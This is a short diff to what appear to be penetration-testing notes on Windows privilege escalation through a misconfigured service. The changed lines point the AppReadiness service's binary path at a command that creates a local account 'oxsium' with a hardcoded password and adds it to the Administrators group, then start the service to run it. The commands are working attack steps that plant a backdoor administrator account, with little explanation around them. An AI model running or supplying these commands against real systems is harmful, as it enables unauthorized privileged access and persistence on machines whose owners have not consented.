@@ -13,12 +13,12 @@ net localgroup Administrators
 
 # Modifying the Service Binary Path
 ```powershell
-sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+sc.exe config AppReadiness binPath= "cmd.exe /c net user oxsium AdminPass123! /add && net localgroup Administrators oxsium /add"
 ```
 
 # Starting the Service
 ```powershell
-sc start AppReadiness
+sc.exe start AppReadiness
 net localgroup Administrators
 ```
 
